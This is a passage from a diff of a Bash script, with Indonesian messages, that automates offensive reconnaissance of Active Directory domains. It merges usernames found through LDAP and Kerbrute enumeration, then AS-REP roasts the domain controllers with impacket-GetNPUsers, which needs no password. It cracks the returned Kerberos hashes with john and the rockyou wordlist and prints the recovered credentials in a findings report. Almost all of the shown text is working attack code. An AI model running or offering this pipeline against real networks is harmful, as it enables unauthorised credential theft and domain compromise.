+echo -e "\n${PURPLE}====================================================${NC}"
+echo -e "${GREEN}[+] PHASE 2.6: MERGE LDAP USERS + KERBRUTE USERS${NC}"
+echo -e "${PURPLE}====================================================${NC}"
+
+if [[ -s "$DC_INFO" ]]; then
+    while IFS=';' read -r dc_ip domain; do
+        [[ -z "$dc_ip" || -z "$domain" || "$domain" == "UNKNOWN" ]] && continue
+
+        SAFE_DOMAIN=$(safe_name "$domain")
+        MERGED_USERS="$OUTDIR/all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
+        TMP_MERGE="$OUTDIR/.tmp_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
+
+        : > "$TMP_MERGE"
+        : > "$MERGED_USERS"
+
+        LDAP_USERS_FILE="$OUTDIR/ldap_nxc_${dc_ip}/users_only_${dc_ip}.txt"
+        KERB_USERS_FILE="$OUTDIR/valid_users_${dc_ip}_${SAFE_DOMAIN}.txt"
+
+        LDAP_COUNT=0
+        KERB_COUNT=0
+
+        if [[ -s "$LDAP_USERS_FILE" ]]; then
+            cat "$LDAP_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
+            LDAP_COUNT=$(wc -l < "$LDAP_USERS_FILE" 2>/dev/null || echo 0)
+        fi
+
+        if [[ -s "$KERB_USERS_FILE" ]]; then
+            cat "$KERB_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
+            KERB_COUNT=$(wc -l < "$KERB_USERS_FILE" 2>/dev/null || echo 0)
+        fi
+
+        sort -u "$TMP_MERGE" > "$MERGED_USERS"
+        rm -f "$TMP_MERGE"
+
+        MERGED_COUNT=$(wc -l < "$MERGED_USERS" 2>/dev/null || echo 0)
+
+        if [[ "$MERGED_COUNT" -gt 0 ]]; then
+            echo -e "${GREEN}[+] Merged users for $dc_ip / $domain: $MERGED_COUNT${NC}"
+            echo -e "${BLUE}[i] LDAP users: $LDAP_COUNT | Kerbrute users: $KERB_COUNT${NC}"
+            echo -e "${BLUE}[i] Merged file: $MERGED_USERS${NC}"
+            echo "MERGED_USERS;$dc_ip;$domain;ldap_users=$LDAP_COUNT;kerbrute_users=$KERB_COUNT;merged_users=$MERGED_COUNT;file=$MERGED_USERS" >> "$MERGED_USERS_STATUS_FILE"
+        else
+            echo -e "${YELLOW}[!] No users to merge for $dc_ip / $domain.${NC}"
+            echo "MERGED_USERS;$dc_ip;$domain;ldap_users=$LDAP_COUNT;kerbrute_users=$KERB_COUNT;merged_users=0;file=$MERGED_USERS" >> "$MERGED_USERS_STATUS_FILE"
+        fi
+
+    done < "$DC_INFO"
+else
+    echo -e "${YELLOW}[!] No DC/domain mapping found. Merge phase skipped.${NC}"
+    echo "MERGED_USERS;GLOBAL;N/A;SKIPPED_NO_DC_INFO;merged_users=0;file=N/A" >> "$MERGED_USERS_STATUS_FILE"
+fi
+
+# ====================================================
+# PHASE 2.7: ASREP ROASTING (NO LDAP)
+# ====================================================
+
+echo -e "\n${PURPLE}====================================================${NC}"
+echo -e "${GREEN}[+] PHASE 2.7: ASREP ROASTING (NO LDAP)${NC}"
+echo -e "${PURPLE}====================================================${NC}"
+
+if ! command -v impacket-GetNPUsers >/dev/null 2>&1; then
+    echo -e "${YELLOW}[!] impacket-GetNPUsers not found. ASREP roasting skipped.${NC}"
+    echo "ASREP_ROAST;GLOBAL;N/A;SKIPPED_NO_IMPACKET;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
+else
+    if [[ -s "$DC_INFO" ]]; then
+        while IFS=';' read -r dc_ip domain; do
+            [[ -z "$dc_ip" || -z "$domain" || "$domain" == "UNKNOWN" ]] && continue
+
+            SAFE_DOMAIN=$(safe_name "$domain")
+
+            USERS_FILE="$OUTDIR/all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
+            HASH_FILE="$OUTDIR/asrep_hashes_${dc_ip}_${SAFE_DOMAIN}.txt"
+            CRACKED_FILE="$OUTDIR/asrep_cracked_${dc_ip}_${SAFE_DOMAIN}.txt"
+
+            : > "$HASH_FILE"
+            : > "$CRACKED_FILE"
+
+            if [[ ! -s "$USERS_FILE" ]]; then
+                echo -e "${YELLOW}[!] No user list found for $dc_ip / $domain. Skipping.${NC}"
+                echo "ASREP_ROAST;$dc_ip;$domain;SKIPPED_NO_USERS;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
+                continue
+            fi
+
+            echo -e "${CYAN}>>> ASREP roasting: DC=$dc_ip Domain=$domain${NC}"
+
+            timeout "${LDAP_TIMEOUT}s" impacket-GetNPUsers "$domain/" \
+                -dc-ip "$dc_ip" \
+                -no-pass \
+                -usersfile "$USERS_FILE" \
+                -format hashcat \
+                -outputfile "$HASH_FILE" >/dev/null 2>&1
+
+            RC=$?
+
+            HASH_COUNT=$(wc -l < "$HASH_FILE" 2>/dev/null || echo 0)
+
+            if [[ "$HASH_COUNT" -gt 0 ]]; then
+                echo -e "${RED}[!] Found $HASH_COUNT ASREP hash(es). Cracking...${NC}"
+
+                john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
+                     --format=krb5asrep \
+                     "$HASH_FILE" > /dev/null 2>&1
+
+                john --show --format=krb5asrep "$HASH_FILE" > "$CRACKED_FILE"
+
+                CRACKED_COUNT=$(grep -c ":" "$CRACKED_FILE" 2>/dev/null || echo 0)
+
+                echo -e "${GREEN}[+] Cracked: $CRACKED_COUNT credential(s). File: $CRACKED_FILE${NC}"
+                cat "$CRACKED_FILE"
+            else
+                CRACKED_COUNT=0
+                echo -e "${GREEN}[+] No ASREP hashes found for $dc_ip / $domain.${NC}"
+            fi
+
+            if [[ "$RC" -eq 0 ]]; then
+                STATUS="COMPLETED"
+            elif [[ "$RC" -eq 124 ]]; then
+                STATUS="TIMEOUT"
+            else
+                STATUS="ERROR_RC_${RC}"
+            fi
+
+            echo "ASREP_ROAST;$dc_ip;$domain;$STATUS;hashes=$HASH_COUNT;cracked=$CRACKED_COUNT;hashfile=$HASH_FILE;crackedfile=$CRACKED_FILE" >> "$ASREP_AUDIT_STATUS_FILE"
+
+        done < "$DC_INFO"
+    else
+        echo -e "${YELLOW}[!] No DC/domain mapping found. Skipping.${NC}"
+        echo "ASREP_ROAST;GLOBAL;N/A;SKIPPED_NO_DC_INFO;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
+    fi
+fi
+
+# ====================================================
+# PHASE 3: CLEANING + FINAL REPORT
+# ====================================================
+
+echo -e "\n${PURPLE}====================================================${NC}"
+echo -e "${GREEN}[+] PHASE 3: CLEANING & FINAL REPORT${NC}"
+echo -e "${PURPLE}====================================================${NC}"
+
+clean_nxc_file "$RAW_OUT"
+
+sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" | \
+grep -aE "\[\+\]|READ|WRITE|Export|VALID USERNAME|USER FOUND|Done|userenum|VALID LOGIN|VALID USER" | \
+grep -av "STATUS_ACCESS_DENIED" | \
+sort -u > "$FINAL_OUT"
+
+if [[ -s "$KERBRUTE_STATUS_FILE" ]]; then
+    {
+        echo ""
+        echo "==== KERBRUTE STATUS ===="
+        cat "$KERBRUTE_STATUS_FILE"
+    } >> "$FINAL_OUT"
+fi
+
+if [[ -s "$MERGED_USERS_STATUS_FILE" ]]; then
+    {
+        echo ""
+        echo "==== MERGED USERS STATUS ===="
+        cat "$MERGED_USERS_STATUS_FILE"
+    } >> "$FINAL_OUT"
+fi
+
+if [[ -s "$ASREP_AUDIT_STATUS_FILE" ]]; then
+    {
+        echo ""
+        echo "==== ASREP ROASTING ===="
+        cat "$ASREP_AUDIT_STATUS_FILE"
+    } >> "$FINAL_OUT"
+fi
+
+if compgen -G "$OUTDIR/all_users_*.txt" > /dev/null; then
+    {
+        echo ""
+        echo "==== MERGED USER FILES ===="
+        for uf in "$OUTDIR"/all_users_*.txt; do
+            [[ -f "$uf" ]] || continue
+            echo "[FILE] $uf"
+            echo "count=$(wc -l < "$uf")"
+            echo ""
+        done
+    } >> "$FINAL_OUT"
+fi
+
+if compgen -G "$OUTDIR/asrep_exposed_users_*.txt" > /dev/null; then
+    {
+        echo ""
+        echo "==== ASREP EXPOSED USERS ===="
+        for af in "$OUTDIR"/asrep_exposed_users_*.txt; do
+            [[ -f "$af" ]] || continue
+            echo "[FILE] $af"
+            if [[ -s "$af" ]]; then
+                cat "$af"
+            else
+                echo "(empty)"
+            fi
+            echo ""
+        done
+    } >> "$FINAL_OUT"
+fi
 
 if [[ -s "$FINAL_OUT" ]]; then
-    echo -e "${GREEN}[!] TEMUAN VALID:${NC}"
+    echo -e "${GREEN}[!] TEMUAN / SUMMARY:${NC}"
     cat "$FINAL_OUT"
 else
-    echo -e "${YELLOW}[!] Tidak ditemukan akses anonymous/guest yang valid.${NC}"
+    echo -e "${YELLOW}[!] Tidak ditemukan akses anonymous/guest/nullbind/userenum yang valid.${NC}"
 fi
 
 echo -e "\n${BLUE}[i] Log lengkap di: $RAW_OUT${NC}"
 echo -e "${BLUE}[i] Ringkasan di: $FINAL_OUT${NC}"
+echo -e "${BLUE}[i] DC candidates di: $DC_CANDIDATES${NC}"
+echo -e "${BLUE}[i] DC/domain mapping di: $DC_INFO${NC}"
+echo -e "${BLUE}[i] Kerbrute status di: $KERBRUTE_STATUS_FILE${NC}"
+echo -e "${BLUE}[i] Merged users status di: $MERGED_USERS_STATUS_FILE${NC}"
+echo -e "${BLUE}[i] ASREP audit status di: $ASREP_AUDIT_STATUS_FILE${NC}"
+
+if compgen -G "$OUTDIR/valid_users_*.txt" > /dev/null; then
+    echo -e "${BLUE}[i] Kerbrute valid users files:${NC}"
+    ls -1 "$OUTDIR"/valid_users_*.txt
+fi
+
+if compgen -G "$OUTDIR/all_users_*.txt" > /dev/null; then
+    echo -e "${BLUE}[i] Merged user files:${NC}"
+    ls -1 "$OUTDIR"/all_users_*.txt
+fi
+
+if compgen -G "$OUTDIR/asrep_exposed_users_*.txt" > /dev/null; then
+    echo -e "${BLUE}[i] ASREP exposed users files:${NC}"
+    ls -1 "$OUTDIR"/asrep_exposed_users_*.txt
+fi
+
+echo -e "\n${GREEN}[+] Done.${NC}"
 
 ```
 
